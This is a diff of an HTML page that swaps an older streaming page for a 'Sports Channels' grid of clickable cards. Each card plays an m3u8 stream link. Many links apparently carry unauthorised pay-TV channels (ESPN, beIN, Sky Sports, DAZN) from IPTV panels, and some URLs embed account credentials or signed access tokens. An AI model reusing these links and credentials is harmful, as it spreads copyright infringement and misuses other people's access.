@@ -1,465 +1,498 @@
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title> Team </title>
-<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-<link href=" https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet" >
-		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
-		<style>
-			:root {
-				--hfs: 2vmax;
-				--primaryColor: red;
-				--secondaryColor: black;
-				--secondaryOpposite: white;
-			}
-			::-webkit-scrollbar {
-				width: 0em;
-				height: 0em;
-			}
-			::-webkit-scrollbar-thumb {
-				background: var(--secondaryColor);
-			}
-			::-webkit-scrollbar-track {
-				background: none;
-			}
-			* {
-				-webkit-user-select: none;
-				-moz-user-select: none;
-				-ms-user-select: none;
-				user-select: none;
-			}
-			body {
-				background-color: var(--secondaryColor);
-			}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sports Channels</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            margin: 0;
+            padding: 0;
+        }
 
-			.alignleft {
-				float: left;
-				margin-left: 5px;
-				font-weight: bold;
-				font-size: 15px;
-			}
+        .header {
+            background-color: #393;
+            padding: 5px;
+            text-align: center;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            position: sticky;
+            top: 0;
+        }
 
-			.alignright {
-				float: right;
-				margin-right: 10px;
-				color: var(--primaryColor);
-				font-weight: normal;
-                font-size: 25px;
-			}
+        .container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
+            gap: 15px;
+            padding: 20px;
+            transition: opacity 0.5s ease;
+        }
 
-			h4  {
-				margin-left: 5px;
-				color: var(--primaryColor);
-				font-weight: bold;
-				font-size: 15px;
-			}
+        .channel-card {
+            background-color: #111;
+            border: 2px solid #0055FF;
+            border-radius: 10px;
+            padding: 10px;
+            text-align: center;
+            color: white;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
 
-			.nta {
-				position: relative;
-				overflow: hidden;
-				color: var(--primaryColor);
-			}
+        .channel-card:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 15px rgba(0, 85, 255, 0.7);
+        }
 
-			div.scrollmenu {
-				background-color: var(--secondaryColor);
-				overflow: auto;
-				white-space: nowrap;
-				position: relative;
-				overflow-y: hidden;
-			}
+        .channel-card img {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background-color: white;
+            padding: 1px;
+            margin-bottom: 1px;
+        }
 
-			div.scrollmenu a {
-				display: inline-block;
-				color: var(--secondaryOpposite);
-				text-align: center;
-				padding: 4px;
-				text-decoration: none;
-			}
+        .channel-card p {
+            font-size: 10px;
+            font-weight: bold;
+            margin: 0;
+        }
 
-			div.scrollmenu a:hover {
-				background-color: var(--secondaryColor);
-			}
+        .video-player {
+            display: none;
+            padding: 20px;
+            background-color: #000;
+            text-align: top;
+            position: sticky;
+            top: 50px;
+        }
 
-			.cen {
-				position: relative;
-				text-align: center;
-				color: var(--secondaryOpposite);
-			}
+        .video-player video {
+            width: 100%;
+            height: auto;
+            border: none;
+        }
 
-			.centered {
-				font-size: var(--hfs);
-				font-weight: bold;
-				position: absolute;
-				top: 80%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-			}
+        .back-button {
+            display: block;
+            margin: 10px auto;
+            padding: 10px 20px;
+            background-color: #0055FF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
 
-			.cent {
-				font-size: auto;
-				position: absolute;
-				top: 95%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-			}
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
 
-			.nt {
-				width: 100px;
-				border-radius: 10px;
-				height: 120px;
-				z-index: 1;
-			}
+        ::-webkit-scrollbar-thumb {
+            background-color: #0055FF;
+            border-radius: 10px;
+        }
 
-			.mnt {
-				width: 100px;
-				border-radius: 2px;
-				height: 100px;
-			}
-			.item img {
-				border-radius: 10px;
-			}
-			#content-container {
-				margin-bottom: 30px;
-			}
-			footer {
-				display: grid;
-				grid-gap: 0.5em;
-				grid-template-columns: repeat(5, minmax(10px, 1fr));
-				position: fixed;
-				bottom: 0;
-				left: 0;
-				width: 100%;
-				background-color: var(--secondaryColor);
-				padding: 0px 4px 10px;
-				justify-content: center;
-				align-items: center;
-                font-size:18px;
-			}
-			footer a {
-				text-align: center;
-				color: var(--primaryColor);
-			}
-			footer a:nth-child(3) i {
-				background: var(--primaryColor);
-				border-radius: 50%;
-				padding: 10px 10px;
-				color: var(--secondaryOpposite);
-				margin-top: -40px;
-				border: 2px solid var(--secondaryColor);
-			}
-		</style>
+        @media (max-width: 600px) {
+            .channel-card img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .channel-card p {
+                font-size: 10px;
+            }
+
+            .video-player video {
+                height: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">All Channels</div>
+
+    <!-- Video Player -->
+    <div class="video-player" id="videoPlayer">
+        <video id="player" controls autoplay>
+            <source src="" id="videoSource" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+        <button class="back-button" onclick="goBack()">Back to All Channels</button>
+    </div>
+
+    <!-- Channel List -->
+    <div class="container" id="channelContainer">
+        <div class="channel-card" onclick="playChannel('https://besttone.online/m3u8.php/bbtsp2.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-slAmiuwb0txewUaaJYccF2y_h9qjM3JSDw&s" alt="TNT Sports">
+            <p>TNT Sports 2</p>
+        </div>
 
 
-<style>::-webkit-scrollbar{
-    display:none
-}
-*{
-    -ms-overflow-style:none;
-    scrollbar-width:none
-}
-body{
-    margin:0;
-    background:#f5f5f5;
-    font-family:Arial,Helvetica,sans-serif;
-    line-height:1.5;
-    color:white;
-    scroll-behavior:smooth;
-    text-align:center;
-}
-#player-wrapper{
-    width:100%;
-    z-index:999;
-}
-.sticky{
-    position:fixed;
-    top:0;
-    width:100%
-}
-#status{
-    position:fixed;
-    bottom:0;
-    right:0;
-    width:100%;
-    background:#fff;
-    display:none;
-}
-.col-sm-2{
-    border-radius:4px
-}
-.sp{
-    width:50%;
-    height:12px;
-    clear:both;
-    margin:20px auto
-}
-.sp-texture{
-    border:1px #000 solid;
-    border-radius:4px;
-    position:relative;
-    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
-    background-size:16px 16px;
-    background-position:0 0;
-    -webkit-animation:spTexture 1s infinite linear;
-    animation:spTexture 1s infinite linear;
-    color:#000;
-    text-align:center;
-    line-height:3em;
-    font-family:roboto
-}
-@-webkit-keyframes spTexture{
-    from{
-        background-position:0 0
-    }
-    to{
-        background-position:-16px 0
-    }
-}
-@keyframes spTexture{
-    from{
-        background-position:0 0
-    }
-    to{
-        background-position:-16px 0
-    }
-}
-.heading{
-    margin:5px auto;
-    text-align:center
-}
-#rmpPlayer{
-    z-index:999
-}
-.white{
-    color:#fff
-}
-.red{
-    color:red
-}
-.yellow{
-    color:#ffdd40
-}
-footer{
-    color:#fff;
-    text-align:center
-}
-footer p{
-    margin-bottom:20px;
-    margin-top:-10px
-}
-.animated{
-    font-family:sans;
-    margin:0;
-    padding:0;
-    font-size:25px;
-    background:url(https://upload.wikimedia.org/wikipedia/commons/3/3b/ColorRotateHr.gif) no-repeat;
-    background-clip:text;
-    -webkit-background-clip:text;
-    color:transparent;
-    animation:moveBg 40s linear infinite;
-    -webkit-animation:moveBg 40s linear infinite
-}
-@keyframes moveBg{
-    0%{
-        background-position:0 30%
-    }
-    100%{
-        background-position:100% 50%
-    }
-}
-.blink{
-    animation-name:blinker;
-    animation-duration:1s;
-    animation-timing-function:linear;
-    animation-iteration-count:infinite
-}
-@keyframes blinker{
-    0%{
-        opacity:1
-    }
-    50%{
-        opacity:0
-    }
-    100%{
-        opacity:1
-    }
-}
-*{
-    -webkit-touch-callout:none;
-    -webkit-user-select:none;
-    -khtml-user-select:none;
-    -moz-user-select:none;
-    -ms-user-select:none;
-    user-select:none
-}
-body{
-    background:#000!important;
-    overflow:hidden;
-    color:white;
-}
-.parent{
-    background:rgba(0,0,0,.9);
-    font-family:"Source Sans Pro",sans-serif;
-    margin:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    position:fixed;
-    top:0;
-    height:100%;
-    width:100%;
-    z-index:999999
-}
-.blobs-container{
-    display:flex
-}
-.blob img{
-    width:50%;
-    display:none;
-    margin:auto;
-    margin-top:25px
-}
-.loading{
-    color:#000;
-    display:block;
-    text-align:center;
-    position:relative;
-    top:30px;
-    left:-2px;
-    background:rgba(255,255,255,.9);
-    padding:0 10px;
-    border-radius:3px;
-    width:80%;
-    margin:auto;
-    font-size:10px
-}
-
-.print{height:65px;
-width:65px;
-
-border-radius:50px;
-border:1.5px solid #f5f5f5;
-padding:2px;
-    margin:3px;
-
-}
-.print:hover{height:90px;
-width:90px;
-border:2px solid red;
-border-radius:5px;webkit-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
--moz-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
-box-shadow: 0px 3px 20px 3px rgba(255,0,0,100);}
-.print:active{height:65px;
-width:65px;
-border:2px solid red;
-border-radius:5px;
-webkit-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
--moz-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
-box-shadow: 0px 3px 20px 3px rgba(0,255,0,100);}
+        <div class="channel-card" onclick="playChannel('http://125.209.88.166:45793/BRN/ArySports.stream/playlist.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/0/0c/A_Sports_Logo.png" alt="A Sports">
+            <p>A Sports</p>
+        </div>
 
 
-marquee{
-border-radius: 0px 0px 0px  0px;
-width: 90%;
-border:2px solid red;
-margin: auto;
-   font-weight:bold;
-   color:#fff;
-display: block;}
-
-.marquee span{display: inline-block;
- background: #ff0000;
- border-radius:  0px 0px 0px 0px;
-  padding: 0px 10px;
-   color: #fff;
-   padding:2px;
-   font-weight:bold;
-    display: inline-block;
-     float: left;
-      width: auto;
-       line-height: 35px;}
-       
-       .marquee marquee{display: block;
-        line-height: 35px;
-         z-index: -1; 
-         margin-right: 10px;
-          width: auto; 
-          margin: auto;}
-          
-
-          
-       .viewer{
-        display: flex;
-        width: 70px;
-        height: auto;
-        padding: 10px;
-        vertical-align: middle;
-      }
-
-  
-          #count{display:flex;font-size:10pt;padding:1px 10px;width:90px;background:Red;border-radius:0px;}
-</style>
-
-<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
-	
-
-		<script>
-var src = {
-  mp4: [
-    'https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs'
-  ],
-  webm: [
-    'https://your-webm-sd-url.webm',
-    'https://your-webm-hd-url.webm',
-    'https://your-webm-full-hd-url.webm'
-  ]
-};
+        <div class="channel-card" onclick="playChannel('https://rtatv.akamaized.net/Content/HLS/Live/channel(RTA3)/variant.m3u8')">
+            <img src="https://yt3.googleusercontent.com/qcDzPkEbeNQ8oII0wIc5FGUaRfUg1BSQI5MDGzT5SX2IFFwRduFL9rtWdMaejYCKtAZIA9E20w=s900-c-k-c0x00ffffff-no-rj" alt="RTA Sports">
+            <p>RTA Sports</p>
+        </div>
 
 
-		</script><div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper">  <script src="https://cdn.radiantmediatechs.com/rmp/6.2.0/js/rmp.min.js"></script> 
-  <!-- Add a div container with a unique id - video and UI elements will be appended to this container -->
-  <div id="rmpPlayer"></div>  
-
- 
-<div class="marquee yellow"><span><i class="fa fa-bell" style="font-size:26pt" aria-hidden="true"></i></span> <marquee scrollamount="5" direction="left" onmouseover="stop()" onmouseout="start()">We are Updating Our Application as We Update Our Application Will B Send Notification To All User's Thanks For Choosing livefy Official </marquee> </div> 
+        <div class="channel-card" onclick="playChannel('http://125.209.88.166:45793/BRN/PTVSports.stream/chunklist_w220167345.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/e/e4/PTV_Sports.png" alt="PTV Sports">
+            <p>PTV Sports</p>
+        </div>
 
 
-
-	
-	<h2>
-		
-		
-	             
+        <div class="channel-card" onclick="playChannel('http://125.209.88.166:45793/BRN/TenSports.stream/playlist.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/1/12/Ten_Sports_Logo.png" alt="TEN Sports">
+            <p>TEN Sports</p>
+        </div>
 
 
- <span url="https://www.btvlive.gov.bd/streams/37f2df30-3edf-42f3-a2ee-6185002c841c/BD/355ba051-9a60-48aa-adcf-5a6c64da8c5c/355ba051-9a60-48aa-adcf-5a6c64da8c5c_3_playlist.m3u8"><img name="ptv sports" autofocus="" class="print" id="ptv sports " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
- <span url="https://www.btvlive.gov.bd/streams/37f2df30-3edf-42f3-a2ee-6185002c841c/BD/355ba051-9a60-48aa-adcf-5a6c64da8c5c/355ba051-9a60-48aa-adcf-5a6c64da8c5c_3_playlist.m3u8"><img class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
- <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img name="ptv sports" autofocus="" class="print" id=" ptv sports " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
-  <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
+        <div class="channel-card" onclick="playChannel('https://rbmn-live.akamaized.net/hls/live/590964/BoRB-AT/master_3360.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQoL9SERlaCqtBECkfooeoGvsjuJIFOnFBh7w&s" alt="RedBull Sports">
+            <p>RedBull TV</p>
+        </div>
 
 
-<script>
-const countEl = document.getElementById('count');
+        <div class="channel-card" onclick="playChannel('https://live4.beinconnect.us/YallaGoalApp/beINSports1.m3u8')">
+            <img src="https://logowik.com/content/uploads/images/bein-sports-13097.logowik.com.webp" alt="Bein Sports">
+            <p>Bein Sports 1</p>
+        </div>
 
-updateVisitCount();
-  
-function updateVisitCount() {
-	fetch('https://api.countapi.xyz/hit/awaispirkale/visits')
-	.then(res => res.json())
-	.then(res => {
-		countEl.innerHTML = res.value;
-	})
-}
+
+        <div class="channel-card" onclick="playChannel('https://hw1.jemtv.com/app/tv85/chunks.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRf6AuuL7WvnK5piKydC8C2BC8C7wUJ47i4HA&s" alt="TV 85">
+            <p>TV 85</p>
+        </div>
+
+
+        <div class="channel-card" onclick="playChannel('https://d1xm2jznwi5xzj.cloudfront.net/out/v1/34e0da501a8c4489b713809eb08a9bf3/index_14.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToHL52mUzlQFG8V44WMzwNyuDmBl-ci0Wl3w&s" alt="TYC Sports">
+            <p>TYC Sports</p>
+        </div>
+
+
+        <div class="channel-card" onclick="playChannel('path_to_your_video10.mp4')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/SI_Solo_Calcio_logo_%282019%29.svg/640px-SI_Solo_Calcio_logo_%282019%29.svg.png" alt="Italia Sports">
+            <p>Italia Sports</p>
+        </div>
+
+
+        <div class="channel-card" onclick="playChannel('https://di-kzbhv8pw.vo.lswcdn.net/sportitalia/sihd/playlist.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/SI_Solo_Calcio_logo_%282019%29.svg/640px-SI_Solo_Calcio_logo_%282019%29.svg.png" alt="Italia 2">
+            <p>Italia 2</p>
+        </div>
+
+
+        <div class="channel-card" onclick="playChannel('https://liveh12.vtvcab.vn/hls/ONVTC1_CL/index.m3u8')">
+            <img src="https://logowik.com/content/uploads/images/vtc-20183107.logowik.com.webp" alt="VTC Sports">
+            <p>VTC 1</p>
+        </div>
+
+
+         <div class="channel-card" onclick="playChannel('https://anonmedia.foo/espn/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSb8gVB_VOZSrxym1jnKzlX2wKwTbTBJDjtYw&s" alt="ESPN">
+            <p>ESPN</p>
+        </div>
+
+
+        <div class="channel-card" onclick="playChannel('https://anonmedia.foo/espn2/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7GiO9M2uoO1ia25nnmGEl6Da-ZUrKLkpvFw&s" alt="ESPN 2">
+            <p>ESPN 2</p>
+        </div>
+
+
+       <div class="channel-card" onclick="playChannel('https://anonmedia.foo/espn3/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSr5TLq61oEeEBcWdcyq9sz1QVYTef8vHREqg&s" alt="ESPN 3">
+            <p>ESPN 3</p>
+        </div>
+
+
+        <div class="channel-card" onclick="playChannel('https://anonmedia.foo/espn4/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTZ_PBqAk7epO5eC7hvObHg15jv6_5MfXA1A&s" alt="ESPN 4">
+            <p>ESPN 4</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('https://anonmedia.foo/espn5/tracks-v1a1/mono.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/ESPN5TV5Logo.png" alt="ESPN 5">
+            <p>ESPN 5</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('https://anonmedia.foo/espn6/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjyLxbJTRJmIAOfpFE6eBOI58OsqHSUvo0jJ4oxal8HzZOGNcesGiqKRTVFnnBK4sb9A&usqp=CAU" alt="ESPN 6">
+            <p>ESPN 6</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('http://41.205.93.154/STARSPORTS1/index.m3u8')">
+            <img src="https://www.91-cdn.com/hub/wp-content/uploads/2022/03/Star-Sports-channels.png" alt="Star Sports">
+            <p>Star Sports</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('http://125.209.88.166:45793/BRN/GeoSuper.stream/playlist.m3u8')">
+            <img src="https://www.geosuper.tv/assets/front/images/live_banner.jpg" alt="GEO Super">
+            <p>GEO Super</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('http://125.209.88.166:45793/BRN/beINSP12.stream/playlist.m3u8')">
+            <img src="https://logowik.com/content/uploads/images/bein-sports-25584.logowik.com.webp" alt="Bein Sports 2">
+            <p>Bein Sports 2</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('https://bcovlive-a.akamaihd.net/r2d2c4ca5bf57456fb1d16255c1a535c8/eu-west-1/eu-west-1/6058004203001/profile_2/chunklist.m3u8')">
+            <img src="https://m.media-amazon.com/images/I/611NwkDJjOL.png" alt="MU TV"><p>MU TV</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('https://cdn-uw2-prod.tsv2.amagi.tv/linear/amg01201-cinedigmenterta-realmadrid-cineverse/playlist.m3u8')">
+            <img src="https://yt3.googleusercontent.com/ytc/AIdro_my85a7XgvL9o_Mc1qhMda-dfcpBPvolz2f1iPL4dhe7d76=s900-c-k-c0x00ffffff-no-rj" alt="Real Madrid">
+            <p>Real Madrid</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('http://starshare.live:8080/live/Habib/Habib/269552.m3u8')">
+            <img src="https://w7.pngwing.com/pngs/301/942/png-transparent-super-sport-hd-logo.png" alt="Super Sports">
+            <p>Super Sports</p>
+        </div> 
+
+
+         <div class="channel-card" onclick="playChannel('https://proxiimity-fire.mominulislamm3u8.workers.dev/stream.m3u8?id=0000001')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbMdMT6RbARTBfVI38LhwxZRH4hNhja4089A&s" alt="Sports 18">
+            <p>Sports 18</p>
+        </div> 
+
+
+        <div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/tsports/tracks-v1a1/mono.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/1/11/T_Sports_logo.png" alt="T Sports">
+            <p>T Sports</p>
+        </div> 
+
+
+        <div class="channel-card" onclick="playChannel('http://109.61.81.147:2080/cdn2/559/video.m3u8?token=4444')">
+            <img src="https://media.info/l/o/1/1539.1689778027.png" alt="TNT Sports">
+            <p>TNT Sports 1</p>
+        </div> 
+
+
+        <div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/gtv2/tracks-v1a1/mono.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/2/20/GTVBangladeshLogo.png" alt="GAZI TV Sports">
+            <p>G TV</p>
+        </div> 
+
+
+        <div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/skysportsfootball/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThu5X1aI0BIdxitAWllWrb7Db7dTHt7hv52w&s" alt="Sky Sports">
+            <p>Sky Sports</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/starsports2-1/tracks-v1a1/mono.m3u8')">
+            <img src="https://img1.hotstarext.com/image/upload/f_auto/sources/r1/cms/prod/7196/597196-h" alt="Star Sports 2">
+            <p>Star Sports 2</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/sonyten1/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8YZtqjljNBOjFU-Y4dpleTvXGWcO6Z6zpPg&s" alt="Sony Ten 1">
+            <p>Sony Ten 1</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/54-sonysports2/tracks-v1a1/mono.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5nlvwAwzIk8hgxplSXjAxr30hb4Buoco5NA&s" alt=" Sony Sports 2">
+            <p>Sony Sports 2</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/sonysports5/tracks-v1a1/mono.m3u8')">
+            <img src="https://dtat2ks7dludr.cloudfront.net/spnsportsindia/channel_logos/SONY_SportsTen5_HD.png" alt="Sony  Sports 5">
+            <p>Sony Sports 5</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/31-Starsportselect/tracks-v1a1/mono.m3u8')">
+            <img src="https://img1.hotstarext.com/image/upload/f_auto/sources/r1/cms/prod/7226/597226-h" alt="Star Sports Select">
+            <p>Star Sports Select</p>
+        </div>
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/starsportsselect2/tracks-v1a1/mono.m3u8')">
+            <img src="https://img1.hotstarext.com/image/upload/f_auto/sources/r1/cms/prod/7227/597227-h" alt="Star Sports Select 2">
+            <p>Star Sports Select 2</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://103.175.242.10:8080/foxcricekt/tracks-v1/mono.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/f/f4/Fox_Cricket_Logo.png" alt="Fox Cricket">
+            <p>Fox Cricket</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://eypv0ag4.siauliairsavlt.pw/iptv/WTRMLWF6MHW5NG/7343/index.m3u8')">
+            <img src="https://skymediaglobal.b-cdn.net/wp-content/uploads/2020/09/Sky-Sports-Cricket-2020-logo-250.png" alt="Sky Sports Cricket">
+            <p>Sky Sports Cricket</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://iptv-hls.idc.md:8200/hls/260/live1.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShFkPyKt50Lx3a8zScIaNdOE22eoclpIv2UA&s" alt="Euro Sports">
+            <p>Euro Sports</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://xlpore-samsungus.amagi.tv/playlist.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSG2qEAcEM7y53cX7-O6hopBr38d7gVNIrtfA&s" alt="Fox Sports 3">
+            <p>Fox Sports 3</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('https://sonyliveevents-nonssaime.akamaized.net/hls/live/2002616/LIV01UEFA/master_mdh.m3u8?hdnea=exp=1731020577~acl=*~id=1556784483112233~hmac=c01ef9675b7839cec37992b1466d2f7819374f9a3e2fa1ae17f7080c26501eac')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtIcBybucJ5WdFBl26owvpHUS8WaFEXyPeZQ&s" alt="Sony  Liv">
+            <p>Sony Liv</p>
+        </div> 
+
+<div class="channel-card" onclick="playChannel('http://37.48.72.77:8080/stream/shahid/ssc2/master576.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Saudi_Sports_Company_logo_20210721.png" alt="Saudi Sports">
+            <p>SSC 2</p>
+        </div> 
+
+<div class="channel-card" onclick="playChannel('http://37.48.72.77:8080/stream/shahid/ssc3/master576.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Saudi_Sports_Company_logo_20210721.png" alt="SSC 3">
+            <p>SSC 3</p>
+        </div> 
+
+<div class="channel-card" onclick="playChannel('http://37.48.72.77:8080/stream/shahid/ssc4/master576.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Saudi_Sports_Company_logo_20210721.png" alt="SSC 4">
+            <p>SSC 4</p>
+        </div> 
+
+<div class="channel-card" onclick="playChannel('http://37.48.72.77:8080/stream/shahid/ssc5/master576.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Saudi_Sports_Company_logo_20210721.png" alt="SSC 5">
+            <p>SSC 5</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://37.48.72.77:8080/stream/shahid/sscextra1/master576.m3u8')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="SSC EXTRA 1">
+            <p>SSC EXTRA 1</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://37.48.72.77:8080/stream/shahid/sscextra2/master576.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Saudi_Sports_Company_logo_20210721.png" alt="SSC EXTRA 2">
+            <p>SSC EXTRA 2</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('https://vo-live.cdb.cdn.orange.com/Content/Channel/AbuDhabiSportsChannel1/HLS/index.m3u8')">
+            <img src="https://vo-static.cdb.cdn.orange.com/adm-uae/Images/attachments/White%20-%20Abu%20Dhabi%20Sports%201.png" alt="Dubai Sports">
+            <p>Dubai Sports 1</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://suprino.xyz:80/PMF3J9X/BV7HG8H/763977')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/DAZN_2.svg/2560px-DAZN_2.svg.png" alt="DAZN 3">
+            <p>DAZN 2 </p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://195.90.209.41:7575/channel/n49361d2/index.m3u8?q=1731142068821')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fc/Astro_Cricket_%282024%29.png" alt="A Sports">
+            <p>Astro Cricket</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('https://cdn1.kriratv.stream/Willow-Cricket/index.fmp4.m3u8?token=cfb6c8863453ed527e6d380694465e4d27dc8dfb-cef3099a705cf11f22bbda9943e0b54a-1736742032-1736731232')">
+            <img src="https://raw.githubusercontent.com/RhqAB/TV/refs/heads/main/Hard/logo_transparent_cb_(1)_prev_ui.png" alt="Willow Cricket">
+            <p>Willow Cricket</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('https://bein-esp-xumo.amagi.tv/playlistR1080p.m3u8')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="Bein Sports Extra">
+            <p>Bein Sports Extra</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://xtv.ooo:8080/live/98267/02727/238479.m3u8')">
+            <img src="https://www.dstv.com/media/fsmkqhfo/ss_laliga.png?width=330" alt="Super Sports">
